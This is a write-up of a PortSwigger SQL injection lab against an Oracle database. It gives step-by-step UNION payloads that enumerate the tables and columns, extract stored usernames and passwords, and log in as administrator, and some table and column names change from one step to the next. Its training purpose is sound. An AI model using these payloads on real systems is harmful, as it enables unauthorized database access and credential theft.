## Question:

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/983c09c6-4616-46ad-8a3c-70e006ee683b)

## Solution:

Request captred and send to repeater

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/7bac203b-7c76-4fdb-8fcb-66f7f2e7a0c8)

Determine number of columns -

`SELECT * FROM someTable WHERE category = '<CATEGORY>' 'UNION SELECT NULL,NULL FROM DUAL--`

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/1adb71d5-5ac6-4669-b412-c0cbcc5f0a50)

NO error which means there are 2 columns.

`SELECT * FROM someTable WHERE category = '<CATEGORY>'' UNION SELECT 'a','b' FROM DUAL--`

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/a0493a63-70ca-4fed-ac09-a31619d0e49e)

Both columns have text data

List all tables -
We can list all the tables by querying `SELECT * FROM all_tables`

`SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT table_name,NULL FROM all_tables--`

We get a list of all the tables

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/fee7fc6b-f3c1-4cc6-b70b-119b7f77fb91)

i think the table we are looking for is `USERS_LYZGBQ` it look like a costom made table.

List all columns -

We can list all the columns by querying `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`

`SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_BJMNXT'--`

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/73af0601-046c-42ea-86a0-c249bfc865c2)

The names of the columns containing usernames and passwords are.

`USERNAME_ISSOTW` and `PASSWORD_TBWIOO`

Retreive admin's password

`SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT USERNAME_XPYOVL,PASSWORD_BHTLLM FROM USERS_BJMNXT--`

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/7573ef49-cb74-44d3-871e-1519b0ec24ce)

the passord retreived

administrator - `4kney960i4s57ay2ma7j` carlos - `4q18fjjalc0rgmhf0jvz` wiener - `1je2jams9t6486m4roxs`

Now try to login as administrator

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/db46e3dd-b9aa-4a1f-be31-efeafb0c5a24)

Lab Solved

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/77b1d187-67cd-4122-9eba-0c7ea003a182)


